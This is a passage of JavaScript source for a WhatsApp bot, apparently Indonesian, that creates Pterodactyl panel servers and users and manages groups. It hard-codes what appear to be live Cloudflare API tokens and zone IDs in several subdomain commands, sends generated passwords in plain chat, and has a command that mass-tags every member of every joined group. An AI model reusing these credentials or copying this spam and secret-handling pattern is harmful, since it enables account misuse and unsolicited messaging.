• UUID : ${user.uuid}
• USERNAME : ${user.username}
• EMAIL : ${user.email}
• NAME : ${user.first_name} ${user.last_name}
• LANGUAGE : ${user.language}
• ADMIN : ${user.root_admin}
• ️CREATED AT : ${user.created_at}

*Password Telah Dikirim Di Private Chat @${u.split`@`[0]}*`, mentions:[u],
})
tamzz.sendMessage(u, { text: `Hai Onii Chan ${pushname} 

• ID : ${user.id}
• EMAIL : ${user.email}
• USERNAME : ${user.username}
• PASSWORD : ${password.toString()}
• LOGIN : ${domain}

*NOTE :*
- MOHON DI SIMPAN ,KARENA BOT TAMZZ - CPANEL BIKIN PANEL HANYA 1× JADI JIKA HILANG JANGAN SALAHKAN BOT TAMZZ - CPANEL`,
})
}
break
case "addsrv2": {
if (!isOwner) return m.reply(mess.owner)
let s = text.split(',');
if (s.length < 7) return m.reply(`*Format salah!*

Penggunaan:
${prefix + command} name,tanggal,userId,eggId,locationId,memory/disk,cpu`)
let name = s[0];
let desc = s[1] || ''
let usr_id = s[2];
let egg = s[3];
let loc = s[4];
let memo_disk = s[5].split`/`;
let cpu = s[6];

let f1 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data = await f1.json();
let startup_cmd = data.attributes.startup

let f = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo_disk[0],
"swap": 0,
"disk": memo_disk[0],
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
m.reply(`
- *SUCCESSFULLY ADD SERVER*

- TYPE: ${res.object}

- ID : ${server.id}
- UUID : ${server.uuid}
- NAME : ${server.name}
- DESCRIPTION : ${server.description}
- MEMORY : ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
- DISK : ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
- CPU : ${server.limits.cpu}%
- CREATED AT : ${server.created_at}`)
}
break
case 'script': case 'sc':{
let text_sc =`_${pushname}👋_\n`
text_sc += "*SCRIPT NO ENC*\n"
text_sc += "Mau beli scriptnya?\n\n"
text_sc += "*Contact Person 📞*\n"
text_sc += "https://wa.me/6285727035336\n\n"
text_sc += "*Pembayaran Via* 💳\n"
text_sc += "_Qris / Dana / Gopay / Ovo_\n\n"
text_sc += "*Harga : Rp900.000 (900K)*\n"
text_sc += "*Harga terlalu mahal?*\n"
text_sc += "*Sans nego dikit gpp*\n\n"
text_sc += "Sudah termasuk tutorial.\n"
text_sc += "Size script sudah ringan.\n"
text_sc += "Anti ngelag/delay."
m.reply(text_sc)
}
break
case 'promoteall':
if (!isOwner) return reply('*ᴡᴀᴅᴜʜ ᴋᴀᴋ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ ʜᴇʜᴇ !*')
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
await reply("DONE✅")
var groupe = await tamzz.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
tamzz.groupParticipantsUpdate(from, mems, 'promote')
break
case 'unblock': {
if (!isOwner) return m.reply('*Khusus ϝαԃȥʋρɳ🤪*')
await reply("DONE✅")
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await tamzz.updateBlockStatus(users, 'unblock').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
case 'block': {
if (!isOwner) return m.reply('*Khusus ϝαԃȥʋρɳ🤪*')
await reply("DONE✅")
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await tamzz.updateBlockStatus(users, 'block').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
case 'editdesk':{
if (!isOwner) return m.reply('*khusus Premium*')
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
if (!text) throw 'Text Nya ?'
await reply("DONE✅")
await tamzz.groupUpdateDescription(from, text).then((res)).catch((err) => m.reply(jsonformat(err)))
}
break
case 'resetlinkgc':
if (!isOwner) return m.reply('*khusus Premium*')
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
await reply("DONE✅")
tamzz.groupRevokeInvite(from)
break
case "setppbot": {
if (!isOwner) return m.reply(mess.owner)
if (!quoted) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (!/image/.test(mime)) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (/webp/.test(mime)) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
var medis = await tamzz.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
if (args[0] == `/full`) {
var { img } = await generateProfilePicture(medis)
await tamzz.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(medis)
m.reply(`Sukses`)
} else {
var memeg = await tamzz.updateProfilePicture(botNumber, { url: medis })
fs.unlinkSync(medis)
m.reply(`Sukses`)
}
}
        break
case "jpmtag":{
if (!isOwner) return reply(`ϝαԃȥʋρɳ Aja`)
if (!text) return reply(`*Penggunaan Salah Silahkan Gunakan Seperti Ini*\n${prefix+command} teks|jeda\n\nReply Gambar Untuk Mengirim Gambar Ke Semua Group\nUntuk Jeda Itu Delay Jadi Nominal Jeda Itu 1000 = 1 detik`)
await reply("_Wait Tuan Ku✅_")
let getGroups = await tamzz.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
for (let xnxx of anu) {
let metadat72 = await tamzz.groupMetadata(xnxx)
let participanh = await metadat72.participants
if (/image/.test(mime)) {
media = await tamzz.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
await tamzz.sendMessage(xnxx, { image: { url: mem }, caption: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
} else {
await tamzz.sendMessage(xnxx, { text: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
}}
reply("*SUCCESFUL TUAN MikkuBot✅*")
}
break   
case "linkgc": case "linkgroup":{
if (!isGroup) return reply(mess.only.group)
if (!isAdmins && !isOwner) return reply(mess.only.admin)
if (!isBotAdmins) return reply(mess.only.badmin)
const url = await tamzz.groupInviteCode(m.chat)
const asu = "https://chat.whatsapp.com/" + url
reply(asu)
}
break
case 'tagall': {
if (!m.isGroup) return
let teks = `══✪〘 *👥 Tag All* 〙✪══
 ➲ *Pesan : ${q ? q : 'kosong'}*\n\n`
for (let mem of participants) {
teks += `⭔ @${mem.id.split('@')[0]}\n`
}
tamzz.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted:kalgans })
}
break
case "vpslist": {
if (!isOwner) return reply(mess.only.owner)
let teksnya = `⊑ *INFORMATION* ⊒
ꆜ *Nama* : ${namabot}
ꆜ *Owner* : ${namaCreator}
ꆜ *Prefix* : Multi Prefix
ꆜ *Versi* : 1.7.0 New
ꆜ *Platfrom* : Chrome ( Ubuntu )`
let sections = [{
title: '# UBUNTU 20.04',
highlight_label: 'Ubuntu 20.04',
rows: [{
title: 'VPS 1 GB 1 CORE',
description: `1GB 1C Os Ubuntu 20 Region Sg`, 
id: '.vps root,sgp1,s-1vcpu-1gb,ubuntu-20-04-x64'
},
{
title: 'VPS 2 GB 1 CORE',
description: `2GB 1C Os Ubuntu 20 Region Sg`, 
id: '.vps root,sgp1,s-1vcpu-2gb,ubuntu-20-04-x64'
},
{
title: 'VPS 4 GB 2 CORE',
description: `4GB 2C Os Ubuntu 20 Region Sg`, 
id: '.vps root,sgp1,s-2vcpu-4gb,ubuntu-20-04-x64'
},
{
title: 'VPS 8 GB 4 CORE',
description: `8GB 4C Os Ubuntu 20 Region Sg`, 
id: '.vps root,sgp1,s-4vcpu-8gb,ubuntu-20-04-x64'
},
{
title: 'VPS 16 GB 4 CORE',
description: `16GB 4C Os Ubuntu 20 Region Nyc`, 
id: '.vps root,nyc3,s-4vcpu-16gb-amd,ubuntu-20-04-x64'
}]
},
{
title: '# UBUNTU 22.04', 
highlight_label: 'Ubuntu 22.04',
rows: [{
title: 'VPS 1 GB 1 CORE',
description: `1GB 1C Os Ubuntu 22 Region Sg`, 
id: '.vps root,sgp1,s-1vcpu-1gb,ubuntu-22-04-x64'
},
{
title: 'VPS 2 GB 1 CORE',
description: `2GB 1C Os Ubuntu 22 Region Sg`, 
id: '.vps root,sgp1,s-1vcpu-2gb,ubuntu-22-04-x64'
},
{
title: 'VPS 4 GB 2 CORE',
description: `4GB 2C Os Ubuntu 22 Region Sg`, 
id: '.vps root,sgp1,s-2vcpu-4gb,ubuntu-22-04-x64'
},
{
title: 'VPS 8 GB 4 CORE',
description: `8GB 4C Os Ubuntu 22 Region Sg`, 
id: '.vps root,sgp1,s-4vcpu-8gb,ubuntu-22-04-x64'
},
{
title: 'VPS 16 GB 4 CORE',
description: `16GB 4C Os Ubuntu 22 Region Nyc`, 
id: '.vps root,nyc3,s-4vcpu-16gb-amd,ubuntu-22-04-x64'
    }]
     }]
let listMessage = {
    title: 'List Vps Ubuntu', 
    sections
};

let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: 'TamzDev 🐋'
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./thumb.png")}, { upload: tamzz.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"Owner\",\"url\":\"https://wa.me/6285555555555\",\"merchant_url\":\"https://wa.me/6285555555555\"}"
}]
}) 
})} 
}}, {userJid: m.sender, quoted: m}) 
await tamzz.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "addmurbug": {
if (!isOwner) return m.reply(mess.only.owner)
if (m.quoted || text) {
let orang = m.mentionedJid[0] ? m.mentionedJid[0] : text ? text.replace(/[^0-9]/g, '')+'@s.whatsapp.net' : m.quoted ? m.quoted.sender : ''
if (murbug.includes(orang)) return m.reply(`User ${orang.split('@')[0]} Sudah Terdaftar Di Database Murbug Kami`)
await murbug.push(orang)
await fs.writeFileSync("./all/database/murbug.json", JSON.stringify(murbug))
m.reply(`Berhasil Menjadikan ${orang.split('@')[0]} Sebagai Murbug Kami`)
} else {
return m.reply("@tag/62838XXX")
}}
break


case "antilink2":{
if (!isGroup) return reply(mess.only.group)
if (!isAdmins && !isOwner) return reply(mess.only.admin)
if (!isBotAdmins) return reply(mess.only.badmin)
if (args[0] == 'on') {
if (antilink) return reply('*Sudah Aktif!*')
antilink = true
reply('*Berhasil Mengaktifkan Antilink*')
} else if (args[0] == 'off') {
if (!antilink) return reply('*Belum Aktif!*')
antilink = false
reply('*Berhasil Mematikan Antilink*')
} else {
reply(`Command Salah Silahkan Gunakan Command Seperti Ini ${prefix}antilink on/off\n${prefix}antilink on = Untuk Menyalakan\n${prefix}antilink off = Untuk Mematikan`)
}
}
break

case "sticker": 
case "s": {
if (!isOwner) return reply(`ϝαԃȥʋρɳ Aja`)
if (!quoted) return reply(`Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await tamzz.sendStimg(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik')
let media = await quoted.download()
let encmedia = await tamzz.sendStvid(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
reply(`Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik`)
}
}
break
case 'getbio':{
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
              try {
    let who
    if (m.isGroup) who = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted.sender
    else who = m.quoted.sender ? m.quoted.sender : m.sender
    let bio = await tamzz.fetchStatus(who)
    reply(bio.status)
  } catch {
    if (text) return reply(`bio is private or you haven't replied to the person's message!`)
    else try {
      let who = m.quoted ? m.quoted.sender : m.sender
      let bio = await tamzz.fetchStatus(who)
      reply(bio.status)
    } catch {
      return reply(`bio is private or you haven't replied to the person's message!`)
    }
  }
}
break
case 'kalkulator':{
if (!q) return reply(`Contoh: ${prefix+command} + 5 6\n\nList kalkulator:\n+\n-\n÷\n×`)
if (q.split(" ")[0] == "+") {
let q1 = Number(q.split(" ")[1])
let q2 = Number(q.split(" ")[2])
reply(`${q1 + q2}`)
} else if (q.split(" ")[0] == "-") {
let q1 = Number(q.split(" ")[1])
let q2 = Number(q.split(" ")[2])
reply(`${q1 - q2}`)
} else if (q.split(" ")[0] == "÷") {
let q1 = Number(q.split(" ")[1])
let q2 = Number(q.split(" ")[2])
reply(`${q1 / q2}`)
} else if (q.split(" ")[0] == "×") {
let q1 = Number(q.split(" ")[1])
let q2 = Number(q.split(" ")[2])
reply(`${q1 * q2}`)
}
}
break
case 'group': case 'grup':
if (!isGroup) return reply(mess.group)
if (!isGroupAdmins && !isOwner) return reply(mess.admin)
if (!isBotGroupAdmins) return reply(mess.botAdmin)
if (!q) return reply(`Contoh: ${prefix+command} open/close`)
if (q.toLowerCase() == "open") {
await tamzz.groupSettingUpdate(from, 'not_announcement')
await reply(`Sukses mengizinkan semua peserta dapat mengirim pesan ke grup ini.`)
} else if (q.toLowerCase() == "close") {
await tamzz.groupSettingUpdate(from, 'announcement')
await reply(`Sukses mengizinkan hanya admin yang dapat mengirim pesan ke grup ini.`)
}
break
case 'toimage': case 'toimg': {
reply("⏱️ *Tunggu Sebentar...*\n> Fitur Sedang Di Proses Jadi Mohon Harap Di Tunggu Ya")
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `Balas sticker dengan caption *${prefix + command}*`
let media = await tamzz.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) throw err
let buffer = fs.readFileSync(ran)
tamzz.sendMessage(from, { image: buffer }, {quoted:kalgans})
fs.unlinkSync(ran)
})
}
break
case "batal": {
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *𝗧𝗥𝗔𝗡𝗦𝗔𝗞𝗦𝗜 𝗕𝗔𝗧𝗔𝗟* )▭▬▭

📆 𝗧𝗮𝗻𝗴𝗴𝗮𝗹: ${tanggal}
🕰️ 𝗪𝗮𝗸𝘁𝘂: ${wib}
✨ 𝗦𝘁𝗮𝘁𝘂𝘀: Batal

𝗦𝗲𝗹𝘂𝗿𝘂𝗵 𝗧𝗿𝗮𝗻𝘀𝗮𝗸𝘀𝗶 𝗕𝗮𝘁𝗮𝗹

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
tamzz.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: qpayment })
}
break
case 'demote': {
if (!isOwner) return reply('*ᴡᴀᴅᴜʜ ᴋᴀᴋ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ ʜᴇʜᴇ !*')
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await tamzz.groupParticipantsUpdate(from, [users], 'demote')
reply("SUKSES MENURUNKAN MENJADI MEMBER✅") 
}
break
case 'hidetag': case 'h': case 'ht': {
if (!isOwner) return reply('*ᴡᴀᴅᴜʜ ᴋᴀᴋ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ ʜᴇʜᴇ !*')
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
tamzz.sendMessage(from, { text : q ? q : '' , mentions: participants.map(a => a.id)}, {quoted:kalgans})
}
break
case 'promote': {
if (!isOwner) return reply('*ᴡᴀᴅᴜʜ ᴋᴀᴋ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ ʜᴇʜᴇ !*')
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await tamzz.groupParticipantsUpdate(from, [users], 'promote')
reply("SUKSES MENJADIKAN ADMIN✅") 
}
break
case 'd1': {
 
        if (!isOwner && !isGroup) return tamzz.sendMessage(from, {audio: fs.readFileSync('./tamzz/lusiapa.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:kalgans})
function subDomain1(host, ip) {
  return new Promise((resolve) => {
    let zone = "5d00f56aee3afd9cc4e0666bc8f23746";
    let apitoken = "mjR4BdiOo6aFO3uPl8BTgZIgOMH3asLbgVsOpEfO";
    let tld = "kedai-panel.my.id";
    axios
      .post(
        `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
        { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
        {
          headers: {
 Authorization: "Bearer " + apitoken,
 "Content-Type": "application/json",
          },
        }
      )
      .then((e) => {
        let res = e.data;
        if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("PENGGUNAAN .domain1 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid Onii Chan" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = MIKKU - HOST 🛍\n┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
 break
 case 'd84': {
 
        if (!isOwner && !isGroup) return tamzz.sendMessage(from, {audio: fs.readFileSync('./tamzz/lusiapa.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:kalgans})
function subDomain1(host, ip) {
  return new Promise((resolve) => {
    let zone = "2e3af11d612e8ce7da35d0bc6b90a266";
    let apitoken = "MAIkTZYYpJ23GxPkTGOUTFfNkkJlwl3sJJi3oN6k";
    let tld = "panel-market.biz.id";
    axios
      .post(
        `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
        { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
        {
          headers: {
 Authorization: "Bearer " + apitoken,
 "Content-Type": "application/json",
          },
        }
      )
      .then((e) => {
        let res = e.data;
        if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("PENGGUNAAN .domain1 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid Onii Chan" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = MIKKU - HOST 🛍\n┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
 break
           
           case 'd2': {
        if (!isOwner && !isGroup) return tamzz.sendMessage(from, {audio: fs.readFileSync('./tamzz/lusiapa.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:kalgans})
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "a476ffcf9243c44a02220f184da527e8";
               let apitoken = "RsbJAI6X7s7bPEj23R7sf28cqHibApP1EBSoF4FZ";
               let tld = "mypanell.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya Onii Chan?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid Onii Chan" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = MIKKU - HOST 🛍\n┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
 break
           
           case 'd3': {
        if (!isOwner && !isGroup) return tamzz.sendMessage(from, {audio: fs.readFileSync('./tamzz/lusiapa.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:kalgans})
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "f374d347f22dc1b0ac208973f185c1f2";
               let apitoken = "m7Xe_0qhlv8enPURlO7UYRSR1-3C7u-uOUkZtvZa";
               let tld = "piwzstoreee.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya Onii Chan?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid Onii Chan" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = MIKKU - HOST 🛍\n┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
 break
           
  case 'd4': {
        if (!isOwner && !isGroup) return tamzz.sendMessage(from, {audio: fs.readFileSync('./tamzz/lusiapa.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:kalgans})
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "c1812c92fb249258e67a28573ca34344";
               let apitoken = "mqAjTHuT_GsaZsWcIjbllV-rrrtJHwyVxVeYlL1A";
               let tld = "piwzpediaaa.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya Onii Chan?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid Onii Chan" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = MIKKU - HOST 🛍\n┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
  break       
  
  case 'd5': {
        if (!isOwner && !isGroup) return tamzz.sendMessage(from, {audio: fs.readFileSync('./tamzz/lusiapa.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:kalgans})
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "3cea2e71ec2bc82ea7865da5999d04b1";
               let apitoken = "eyOrW0eUPe0VxhQzzubXhY1w8X_Z120crfqpsNwL";
               let tld = "piwzpanel.me";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
